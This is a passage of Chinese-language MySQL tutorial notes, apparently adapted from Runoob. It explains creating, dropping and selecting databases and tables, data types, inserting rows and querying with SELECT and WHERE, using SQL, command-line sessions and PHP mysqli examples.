<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;root&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接错误: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &#x27;CREATE DATABASE RUNOOB&#x27;;</span><br><span class="line">$retval = mysqli_query($conn,$sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;创建数据库失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据库 RUNOOB 创建成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-删除数据库"><a href="#MySQL-删除数据库" class="headerlink" title="MySQL 删除数据库"></a>MySQL 删除数据库</h2><h3 id="使用drop-命令"><a href="#使用drop-命令" class="headerlink" title="使用drop 命令"></a>使用drop 命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP DATABASE 数据库名;        -- 直接删除数据库，不检查是否存在</span><br><span class="line">或</span><br><span class="line">DROP DATABASE IF EXISTS 数据库名;</span><br></pre></td></tr></table></figure>

<h3 id="使用-mysqladmin-1"><a href="#使用-mysqladmin-1" class="headerlink" title="使用 mysqladmin"></a>使用 mysqladmin</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqladmin -u root -p drop 数据库名</span><br></pre></td></tr></table></figure>

<h3 id="使用-PHP-脚本"><a href="#使用-PHP-脚本" class="headerlink" title="使用 PHP 脚本"></a>使用 PHP 脚本</h3><p>PHP使用 <code>mysqli_query</code> 函数来创建或者删除 MySQL 数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;root&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &#x27;DROP DATABASE RUNOOB&#x27;;</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;删除数据库失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据库 RUNOOB 删除成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-选择数据库"><a href="#MySQL-选择数据库" class="headerlink" title="MySQL 选择数据库"></a>MySQL 选择数据库</h2><h3 id="从命令提示窗口中"><a href="#从命令提示窗口中" class="headerlink" title="从命令提示窗口中"></a>从命令提示窗口中</h3><p>在 MySQL 中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USE 数据库名;</span><br></pre></td></tr></table></figure>

<p>在命令行中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p -D 数据库名</span><br></pre></td></tr></table></figure>

<h3 id="使用-PHP-脚本-1"><a href="#使用-PHP-脚本-1" class="headerlink" title="使用 PHP 脚本"></a>使用 PHP 脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqli_select_db(connection,dbname);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>connection</em></td>
<td align="left">必需。规定要使用的 MySQL 连接。</td>
</tr>
<tr>
<td align="left"><em>dbname</em></td>
<td align="left">必需，规定要使用的默认数据库。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&#x27;;</span><br><span class="line">mysqli_select_db($conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-数据类型"><a href="#MySQL-数据类型" class="headerlink" title="MySQL 数据类型"></a>MySQL 数据类型</h2><p><a href="https://www.runoob.com/mysql/mysql-data-types.html">详见</a></p>
<h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><h4 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h4><p><code>TINYINT</code> ：存储年龄、数量</p>
<p> <code>INT</code> 或 <code>BIGINT</code>：主键或用户ID</p>
<h4 id="小数类型"><a href="#小数类型" class="headerlink" title="小数类型"></a>小数类型</h4><p><code>DECIMAL</code>：需要精确存储的小数，例如货币金额</p>
<p><code>FLOAT</code>或<code>DOUBLE</code>：需要近似存储的小数，例如科学计算结果</p>
<h3 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h3><p><code>DATE</code>：仅存储日期</p>
<p><code>DATETIME</code>：存储日期和时间，例如用户注册时间</p>
<p><code>TIMESTAMP</code>：带有时区的日期时间（自动更新），例如日志记录时间</p>
<p><code>TIME</code>：存储时间部分</p>
<h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><p> <code>CHAR</code>：数据长度固定，例如存储固定长度的编码</p>
<p> <code>VARCHAR</code>：数据长度不固定，例如存储用户名、邮箱地址</p>
<p><code>TEXT</code>或<code>BLOB</code>：需要存储大文本或二进制数据时，例如文章内容存储在 <code>TEXT</code> 中，图片存储在 <code>BLOB</code> 中</p>
<h3 id="枚举与集合类型"><a href="#枚举与集合类型" class="headerlink" title="枚举与集合类型"></a>枚举与集合类型</h3><p> <code>ENUM</code> 或 <code>TINYINT</code> ：有限的枚举数据（如状态值 <code>active/inactive</code>）</p>
<h3 id="空间数据类型"><a href="#空间数据类型" class="headerlink" title="空间数据类型"></a>空间数据类型</h3><h2 id="MySQL-创建数据表"><a href="#MySQL-创建数据表" class="headerlink" title="MySQL 创建数据表"></a>MySQL 创建数据表</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE table_name (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>table_name</code> 是要创建的表的名称。</li>
<li><code>column1</code>, <code>column2</code>, … 是表中的列名。</li>
<li><code>datatype</code> 是每个列的数据类型。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE users (</span><br><span class="line">    id INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">    username VARCHAR(50) NOT NULL,</span><br><span class="line">    email VARCHAR(100) NOT NULL,</span><br><span class="line">    birthdate DATE,</span><br><span class="line">    is_active BOOLEAN DEFAULT TRUE</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><code>AUTO_INCREMENT</code> 关键字用于创建一个自增长的列，数值会自动加 1</p>
<p><code>PRIMARY KEY</code> 用于定义主键（是用来唯一标识数据库表中每一条记录的字段（或字段组合））</p>
<p><code>NOT NULL</code>不允许为空</p>
<p>如果希望在创建表时指定数据引擎，字符集和排序规则等，可以使用 <strong>CHARACTER SET</strong> 和 <strong>COLLATE</strong> 子句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE mytable (</span><br><span class="line">    id INT PRIMARY KEY,</span><br><span class="line">    name VARCHAR(50)</span><br><span class="line">) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;</span><br></pre></td></tr></table></figure>

<p>以下例子中我们将在 RUNOOB 数据库中创建数据表 runoob_tbl：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `runoob_tbl`(</span><br><span class="line">   `runoob_id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   `runoob_title` VARCHAR(100) NOT NULL,</span><br><span class="line">   `runoob_author` VARCHAR(40) NOT NULL,</span><br><span class="line">   `submission_date` DATE,</span><br><span class="line">   PRIMARY KEY ( `runoob_id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure>

<p><code>ENGINE</code> 设置存储引擎，<code>CHARSET</code> 设置编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@host# mysql -u root -p</span><br><span class="line">Enter password:****</span><br><span class="line">mysql&gt; USE RUNOOB;</span><br><span class="line">DATABASE changed</span><br><span class="line">mysql&gt; CREATE TABLE runoob_tbl(</span><br><span class="line">   -&gt; runoob_id INT NOT NULL AUTO_INCREMENT,</span><br><span class="line">   -&gt; runoob_title VARCHAR(100) NOT NULL,</span><br><span class="line">   -&gt; runoob_author VARCHAR(40) NOT NULL,</span><br><span class="line">   -&gt; submission_date DATE,</span><br><span class="line">   -&gt; PRIMARY KEY ( runoob_id )</span><br><span class="line">   -&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">Query OK, 0 ROWS affected (0.16 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<p>MySQL 命令终止符为分号 <code>;</code></p>
<p><code>-&gt;</code> 是换行符标识</p>
<h3 id="使用-PHP-脚本创建数据表"><a href="#使用-PHP-脚本创建数据表" class="headerlink" title="使用 PHP 脚本创建数据表"></a>使用 PHP 脚本创建数据表</h3><p>使用 PHP 的 <code>mysqli_query()</code> 函数来创建已存在数据库的数据表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqli_query(connection,query,resultmode);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>connection</em></td>
<td align="left">必需。规定要使用的 MySQL 连接。</td>
</tr>
<tr>
<td align="left"><em>query</em></td>
<td align="left">必需，规定查询字符串。</td>
</tr>
<tr>
<td align="left"><em>resultmode</em></td>
<td align="left">可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）MYSQLI_STORE_RESULT（默认）</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;root&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &quot;CREATE TABLE runoob_tbl( &quot;.</span><br><span class="line">        &quot;runoob_id INT NOT NULL AUTO_INCREMENT, &quot;.</span><br><span class="line">        &quot;runoob_title VARCHAR(100) NOT NULL, &quot;.</span><br><span class="line">        &quot;runoob_author VARCHAR(40) NOT NULL, &quot;.</span><br><span class="line">        &quot;submission_date DATE, &quot;.</span><br><span class="line">        &quot;PRIMARY KEY ( runoob_id ))ENGINE=InnoDB DEFAULT CHARSET=utf8; &quot;;</span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;数据表创建失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据表创建成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="通过命令行查看表结构"><a href="#通过命令行查看表结构" class="headerlink" title="通过命令行查看表结构"></a>通过命令行查看表结构</h3><p><code>show tables;</code></p>
<p><code>desc runoob_tbl;</code></p>
<h2 id="MySQL-删除数据表"><a href="#MySQL-删除数据表" class="headerlink" title="MySQL 删除数据表"></a>MySQL 删除数据表</h2><h3 id="通过命令提示符删除数据表"><a href="#通过命令提示符删除数据表" class="headerlink" title="通过命令提示符删除数据表"></a>通过命令提示符删除数据表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE table_name;     -- 直接删除表，不检查是否存在</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE [IF EXISTS] table_name;  -- 会检查是否存在，如果存在则删除</span><br></pre></td></tr></table></figure>

<p>如果只是想删除表中的所有数据，但保留表的结构，可以使用 <code>TRUNCATE TABLE</code> 语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TRUNCATE TABLE table_name;</span><br></pre></td></tr></table></figure>

<h3 id="使用-PHP-脚本删除数据表"><a href="#使用-PHP-脚本删除数据表" class="headerlink" title="使用 PHP 脚本删除数据表"></a>使用 PHP 脚本删除数据表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqli_query(connection,query,resultmode);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &quot;DROP TABLE runoob_tbl&quot;;</span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;数据表删除失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据表删除成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-插入数据"><a href="#MySQL-插入数据" class="headerlink" title="MySQL 插入数据"></a>MySQL 插入数据</h2><p>MySQL 表中使用 <code>INSERT INTO</code>语句来插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO table_name (column1, column2, column3, ...)</span><br><span class="line">VALUES (value1, value2, value3, ...);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>table_name</code> 是你要插入数据的表的名称。</li>
<li><code>column1</code>, <code>column2</code>, <code>column3</code>, … 是表中的列名。</li>
<li><code>value1</code>, <code>value2</code>, <code>value3</code>, … 是要插入的具体数值(如果数据是字符型，必须使用单引号 <strong>‘</strong> 或者双引号 <strong>“</strong>)</li>
</ul>
<p>如果要插入所有列的数据，可以省略列名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO users</span><br><span class="line">VALUES (NULL,&#x27;test&#x27;, &#x27;test@runoob.com&#x27;, &#x27;1990-01-01&#x27;, true);</span><br></pre></td></tr></table></figure>

<p>这里，<strong>NULL</strong> 是用于自增长列的占位符，表示系统将为 <strong>id</strong> 列生成一个唯一的值</p>
<p>如果你要插入多行数据，可以在 VALUES 子句中指定多组数值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO users (username, email, birthdate, is_active)</span><br><span class="line">VALUES</span><br><span class="line">    (&#x27;test1&#x27;, &#x27;test1@runoob.com&#x27;, &#x27;1985-07-10&#x27;, true),</span><br><span class="line">    (&#x27;test2&#x27;, &#x27;test2@runoob.com&#x27;, &#x27;1988-11-25&#x27;, false),</span><br><span class="line">    (&#x27;test3&#x27;, &#x27;test3@runoob.com&#x27;, &#x27;1993-05-03&#x27;, true);</span><br></pre></td></tr></table></figure>

<h3 id="通过命令提示窗口插入数据"><a href="#通过命令提示窗口插入数据" class="headerlink" title="通过命令提示窗口插入数据"></a>通过命令提示窗口插入数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@host# mysql -u root -p password;</span><br><span class="line">Enter password:*******</span><br><span class="line">mysql&gt; USE RUNOOB;</span><br><span class="line">DATABASE changed</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl </span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;学习 PHP&quot;, &quot;菜鸟教程&quot;, NOW());</span><br><span class="line">Query OK, 1 ROWS affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl</span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;学习 MySQL&quot;, &quot;菜鸟教程&quot;, NOW());</span><br><span class="line">Query OK, 1 ROWS affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl</span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;JAVA 教程&quot;, &quot;RUNOOB.COM&quot;, &#x27;2016-05-06&#x27;);</span><br><span class="line">Query OK, 1 ROWS affected (0.00 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<p>实例中 <strong>NOW()</strong> 是一个 MySQL 函数，该函数返回日期和时间</p>
<p>查看数据表数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from runoob_tbl;</span><br></pre></td></tr></table></figure>

<h3 id="使用-PHP-脚本插入数据"><a href="#使用-PHP-脚本插入数据" class="headerlink" title="使用 PHP 脚本插入数据"></a>使用 PHP 脚本插入数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqli_query(connection,query,resultmode);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;root&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$runoob_title = &#x27;学习 Python&#x27;;</span><br><span class="line">$runoob_author = &#x27;RUNOOB.COM&#x27;;</span><br><span class="line">$submission_date = &#x27;2016-03-06&#x27;;</span><br><span class="line"> </span><br><span class="line">$sql = &quot;INSERT INTO runoob_tbl &quot;.</span><br><span class="line">        &quot;(runoob_title,runoob_author, submission_date) &quot;.</span><br><span class="line">        &quot;VALUES &quot;.</span><br><span class="line">        &quot;(&#x27;$runoob_title&#x27;,&#x27;$runoob_author&#x27;,&#x27;$submission_date&#x27;)&quot;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;无法插入数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据插入成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对于含有中文的数据插入，需要添加 <strong>mysqli_query($conn , “set names utf8”);</strong> 语句</p>
<h2 id="MySQL-查询数据"><a href="#MySQL-查询数据" class="headerlink" title="MySQL 查询数据"></a>MySQL 查询数据</h2><p>MySQL 数据库使用 <strong>SELECT</strong> 语句来查询数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">[WHERE condition]</span><br><span class="line">[ORDER BY column_name [ASC | DESC]]</span><br><span class="line">[LIMIT number];</span><br></pre></td></tr></table></figure>

<ul>
<li><code>column1</code>, <code>column2</code>, … 是你想要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li><code>table_name</code> 是你要从中查询数据的表的名称。</li>
<li><code>WHERE condition</code> 是一个可选的子句，用于指定过滤条件，只返回符合条件的行。</li>
<li><code>ORDER BY column_name [ASC | DESC]</code> 是一个可选的子句，用于指定结果集的排序顺序，默认是升序（ASC）。</li>
<li><code>LIMIT number</code> 是一个可选的子句，用于限制返回的行数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 选择所有列的所有行</span><br><span class="line">SELECT * FROM users;</span><br><span class="line"></span><br><span class="line">-- 选择特定列的所有行</span><br><span class="line">SELECT username, email FROM users;</span><br><span class="line"></span><br><span class="line">-- 添加 WHERE 子句，选择满足条件的行</span><br><span class="line">SELECT * FROM users WHERE is_active = TRUE;</span><br><span class="line"></span><br><span class="line">-- 添加 ORDER BY 子句，按照某列的升序排序</span><br><span class="line">SELECT * FROM users ORDER BY birthdate;</span><br><span class="line"></span><br><span class="line">-- 添加 ORDER BY 子句，按照某列的降序排序</span><br><span class="line">SELECT * FROM users ORDER BY birthdate DESC;</span><br><span class="line"></span><br><span class="line">-- 添加 LIMIT 子句，限制返回的行数</span><br><span class="line">SELECT * FROM users LIMIT 10;</span><br></pre></td></tr></table></figure>

<h3 id="通过命令提示符获取数据"><a href="#通过命令提示符获取数据" class="headerlink" title="通过命令提示符获取数据"></a>通过命令提示符获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from runoob_tbl;</span><br></pre></td></tr></table></figure>

<h3 id="使用-PHP-脚本来获取数据"><a href="#使用-PHP-脚本来获取数据" class="headerlink" title="使用 PHP 脚本来获取数据"></a>使用 PHP 脚本来获取数据</h3><p>使用 PHP 函数的 <strong>mysqli_query()</strong> 及 <strong>SQL SELECT</strong> 命令来获取数据。该函数用于执行 SQL 命令，然后通过 PHP 函数 <strong>mysqli_fetch_array()</strong> 来使用或输出所有查询的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;root&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 mysqli_fetch_array 测试&lt;/h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">/*while($row = mysqli_fetch_array($retval, MYSQLI_NUM))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[0]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[1]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[2]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[3]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;*/</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">// 释放内存</span><br><span class="line">mysqli_free_result($retval);</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="mysqli-fetch-array-result-result-type"><a href="#mysqli-fetch-array-result-result-type" class="headerlink" title="mysqli_fetch_array($result, $result_type);"></a>mysqli_fetch_array($result, $result_type);</h4><p>**<code>$result</code>**：必需，表示查询的结果集。通常是通过 <code>mysqli_query()</code> 执行查询后得到的。</p>
<p>**<code>$result_type</code>**：可选，指定返回的数组类型，可以是以下值：</p>
<ul>
<li>**<code>MYSQLI_ASSOC</code>**：返回关联数组，列名作为键。</li>
<li>**<code>MYSQLI_NUM</code>**：返回数字数组，列的索引作为键。</li>
</ul>
</blockquote>
<p>执行完 SELECT 语句后，通过 PHP 函数 <code>mysqli_free_result()</code> 来实现内存的释放</p>
<h2 id="MySQL-WHERE-子句"><a href="#MySQL-WHERE-子句" class="headerlink" title="MySQL WHERE 子句"></a>MySQL WHERE 子句</h2><p>将 WHERE 子句添加到 SELECT 语句中可以有条件地从表中选取数据（过滤查询结果），只返回满足特定条件的行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE condition;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>column1</code>, <code>column2</code>, … 是你要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li><code>table_name</code> 是你要从中查询数据的表的名称。</li>
<li><code>WHERE condition</code> 是用于指定过滤条件的子句。</li>
</ul>
<blockquote>
<p>[!TIP]</p>
<ul>
<li>查询语句中你可以使用一个或者多个表，表之间使用逗号**,** 分割，并使用WHERE语句来设定查询条件。</li>
<li>你可以在 WHERE 子句中指定任何条件。</li>
<li>你可以使用 AND 或者 OR 指定一个或多个条件。</li>
<li>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</li>
<li>WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。</li>
</ul>
</blockquote>
<p>组合条件（AND、OR）:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products WHERE category = &#x27;Electronics&#x27; AND price &gt; 100.00;</span><br><span class="line"></span><br><span class="line">SELECT * FROM orders WHERE order_date &gt;= &#x27;2023-01-01&#x27; OR total_amount &gt; 1000.00;</span><br></pre></td></tr></table></figure>

<p>模糊匹配条件（LIKE）:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM customers WHERE first_name LIKE &#x27;J%&#x27;;</span><br></pre></td></tr></table></figure>

<p> IN 条件:</p>
